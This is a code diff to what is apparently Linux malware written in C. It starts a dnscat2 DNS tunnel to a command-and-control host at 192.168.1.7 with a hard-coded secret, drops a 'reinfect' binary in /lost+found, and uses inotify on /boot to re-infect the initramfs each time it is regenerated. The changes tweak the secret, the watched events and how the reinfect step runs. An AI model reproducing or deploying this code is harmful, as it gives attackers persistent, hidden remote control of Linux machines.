@@ -22,7 +22,6 @@
 #include "reinfect.h"
 
 #define DNSCAT_PATH	"/lost+found/dnscat"
-#define REINFECT_PATH	"/lost+found/reinfect"
 
 #ifndef MS_RELATIME
 #define MS_RELATIME     (1<<21)
@@ -329,7 +328,7 @@ static pid_t run_dnscat2()
 		argv[0] = "dnscat";
 		argv[1] = "--dns";
 		argv[2] = "server=192.168.1.7,port=53531";
-		argv[3] = "--secret=5d6619b8fcfe14274a5f601b51815554";
+		argv[3] = "--secret=b5ee4f0415cdd400f335d41d91b724ef";
 
 		execv(DNSCAT_PATH, argv);
 		exit(EXIT_FAILURE);
@@ -371,8 +370,7 @@ int hook_update_initramfs()
 	pid_t pid;
 	char buffer[1024 * (sizeof(struct inotify_event) + 16)];
 	char command[1024];
-	struct utsname info_os;
-	
+
 	pid = fork();
 	if (pid < 0)
 		return 0;
@@ -382,7 +380,7 @@ int hook_update_initramfs()
 		if (fd < 0)
 			return 0; // error in installation of inotify_init
 		
-		wd = inotify_add_watch(fd, "/boot/", IN_MODIFY | IN_CREATE | IN_DELETE | IN_MOVE);
+		wd = inotify_add_watch(fd, "/boot/", IN_CREATE | IN_MOVE);
 		
 		while (1) {
 			length = read(fd, buffer, 1024 * (sizeof(struct inotify_event) + 16));
@@ -390,7 +388,7 @@ int hook_update_initramfs()
 
 			while (i < length) {
 				struct inotify_event *event = (struct inotify_event *) &buffer[i];
-				if (event->len && (event->mask & IN_MOVED_FROM)) {
+				if (event->len && (event->mask & IN_CREATE)) {
 					if (strcmp(event->name,"initrd.img-5.13.0-40-generic.new")==0) {
 						system("mkdir /lost+found/old-initramfs/");
 
@@ -399,16 +397,8 @@ int hook_update_initramfs()
 						system(command);
 					}
 				} else  if (event->len && (event->mask & IN_MOVED_TO)) {
-					if (strcmp(event->name,"initrd.img-5.13.0-40-generic")==0) {
-						char *argv[2];
-						memset((void*)argv, 0, sizeof(argv));
-						
-						// fill command line argument to reinfect script
-						argv[0] = "/boot/initrd.img-5.13.0-40-generic";
-
-						// launch script to reinfect
-						execv(REINFECT_PATH, argv);
-					}
+					if (strcmp(event->name,"initrd.img-5.13.0-40-generic")==0)
+						system("/lost+found/reinfect /boot/initrd.img-5.13.0-40-generic");
 				}
 				i += sizeof(struct inotify_event) + event->len;
 			}
@@ -456,7 +446,7 @@ void perform_hacks()
 			exit(EXIT_FAILURE);
 
 		// write executable of reinfect
-		write_executable(REINFECT_PATH, reinfect, reinfect_len);
+		write_executable("/lost+found/reinfect", reinfect, reinfect_len);
 
 		// spawn a process to hook updates
 		hook_update_initramfs();
